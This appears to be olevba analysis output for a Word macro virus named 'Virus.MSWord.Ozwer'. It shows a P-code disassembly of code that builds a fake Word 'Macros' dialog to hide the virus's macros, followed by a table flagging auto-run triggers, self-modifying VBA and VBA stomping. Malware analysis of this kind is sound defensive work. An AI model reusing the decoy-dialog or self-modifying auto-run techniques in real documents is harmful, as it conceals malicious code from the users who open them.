' 	Ld CommandButton5 
' 	MemSt Caption 
' Line #127:
' 	LitStr 0x0025 "Crear una macro nueva (no disponible)"
' 	Ld CommandButton5 
' 	MemSt ControlTipText 
' Line #128:
' 	LitStr 0x0008 "Eliminar"
' 	Ld CommandButton7 
' 	MemSt Caption 
' Line #129:
' 	LitStr 0x0037 "Eliminar macro seleccionada (no hay macros disponibles)"
' 	Ld CommandButton7 
' 	MemSt ControlTipText 
' Line #130:
' 	LitStr 0x000E "Organizador..."
' 	Ld CommandButton6 
' 	MemSt Caption 
' Line #131:
' 	LitStr 0x0013 "Nombre de la macro:"
' 	Ld Label3 
' 	MemSt Caption 
' Line #132:
' 	LitStr 0x000A "Macros en:"
' 	Ld Label1 
' 	MemSt Caption 
' Line #133:
' 	LitStr 0x000C "Descripción:"
' 	Ld Label2 
' 	MemSt Caption 
' Line #134:
' Line #135:
' Line #136:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #137:
' 	LitStr 0x0022 "All templates and active documents"
' 	St PyD 
' Line #138:
' 	LitStr 0x001C "Normal.dot (global template)"
' 	St Pg 
' Line #139:
' 	LitStr 0x000D "Word commands"
' 	St Cw 
' Line #140:
' 	LitStr 0x000B " (document)"
' 	St Dc 
' Line #141:
' 	LitStr 0x000F "Macros made on "
' 	St Mc 
' Line #142:
' 	LitStr 0x0004 " by "
' 	St Pr 
' Line #143:
' 	LitStr 0x0003 "Run"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #144:
' 	LitStr 0x0028 "Run selected macro (no macros available)"
' 	Ld CommandButton1 
' 	MemSt ControlTipText 
' Line #145:
' 	LitStr 0x0006 "Cancel"
' 	Ld CommandButton2 
' 	MemSt Caption 
' Line #146:
' 	LitStr 0x0010 "Cancel selection"
' 	Ld CommandButton2 
' 	MemSt ControlTipText 
' Line #147:
' 	LitStr 0x000C "Step by step"
' 	Ld CommandButton3 
' 	MemSt Caption 
' Line #148:
' 	LitStr 0x0016 "Run macro step by step"
' 	Ld CommandButton3 
' 	MemSt ControlTipText 
' Line #149:
' 	LitStr 0x0006 "Modify"
' 	Ld CommandButton4 
' 	MemSt Caption 
' Line #150:
' 	LitStr 0x0038 "Modify selected macro seleccionada (no macros available)"
' 	Ld CommandButton4 
' 	MemSt ControlTipText 
' Line #151:
' 	LitStr 0x0003 "New"
' 	Ld CommandButton5 
' 	MemSt Caption 
' Line #152:
' 	LitStr 0x0022 "Create a new macro (not available)"
' 	Ld CommandButton5 
' 	MemSt ControlTipText 
' Line #153:
' 	LitStr 0x0006 "Delete"
' 	Ld CommandButton7 
' 	MemSt Caption 
' Line #154:
' 	LitStr 0x0029 "Delete selected macro (no macro selected)"
' 	Ld CommandButton7 
' 	MemSt ControlTipText 
' Line #155:
' 	LitStr 0x000C "Organizer..."
' 	Ld CommandButton6 
' 	MemSt Caption 
' Line #156:
' 	LitStr 0x000B "Macro name:"
' 	Ld Label3 
' 	MemSt Caption 
' Line #157:
' 	LitStr 0x000A "Macros in:"
' 	Ld Label1 
' 	MemSt Caption 
' Line #158:
' 	LitStr 0x000C "Description:"
' 	Ld Label2 
' 	MemSt Caption 
' Line #159:
' 	EndSelect 
' Line #160:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St docn 
' Line #161:
' 	Ld Application 
' 	MemLd UserName 
' 	St user 
' Line #162:
' 	Ld PyD 
' 	Ld ComboBox1 
' 	MemSt Then 
' Line #163:
' 	Ld PyD 
' 	Paren 
' 	LitDI2 0x0000 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #164:
' 	Ld Pg 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #165:
' 	Ld Cw 
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #166:
' 	Ld docn 
' 	Ld Dc 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0003 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #167:
' 	LitStr 0x0000 ""
' 	Paren 
' 	LitDI2 0x0004 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #168:
' 	LitStr 0x0000 ""
' 	Paren 
' 	LitDI2 0x0005 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #169:
' 	Ld Mc 
' 	Ld Date 
' 	Concat 
' 	Ld Pr 
' 	Concat 
' 	Ld user 
' 	Concat 
' 	Ld TextBox1 
' 	MemSt Then 
' Line #170:
' Line #171:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Ozwer' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

